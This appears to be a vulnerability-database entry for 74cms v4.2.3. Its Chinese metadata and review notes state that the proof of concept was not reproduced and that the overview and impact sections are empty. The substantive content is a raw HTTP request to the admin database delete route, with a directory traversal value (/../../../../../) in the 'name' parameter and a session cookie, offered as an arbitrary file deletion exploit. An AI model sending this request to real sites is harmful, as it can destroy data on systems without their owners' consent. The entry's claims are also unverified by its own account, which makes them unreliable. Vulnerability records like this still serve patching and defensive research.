---
source: "hatch 补库批 20260928"
product: "74cms"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "74cms v4.2.3 任意文件删除"
prerequisites: "来源所述条件，未列明部分仍待核：4.2.3 only in title; admin/database/del route with session cookie; auth not explained"
side_effects: "未执行；本文需注意的操作影响：Broad directory traversal delete request does not prove arbitrary-file deletion or permission scope"
source_status: "unknown"
id: "vw-2068b509550d95f70e7d6a20"
entity_id: "ve-2068b509550d95f70e7d6a20"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：4.2.3 only in title; admin/database/del route with session cookie; auth not explained

- **证据待核（1）**：Overview and impact empty; no response, source analysis, or provenance。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **操作与副作用边界（2）**：Broad directory traversal delete request does not prove arbitrary-file deletion or permission scope。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 74cms v4.2.3 任意文件删除

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    GET /index.php?m=admin&c=database&a=del&name=/../../../../../ HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate
    Referer: http://127.0.0.1/index.php?m=admin&c=database&a=restore
    Connection: close
    Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
    Upgrade-Insecure-Requests: 1
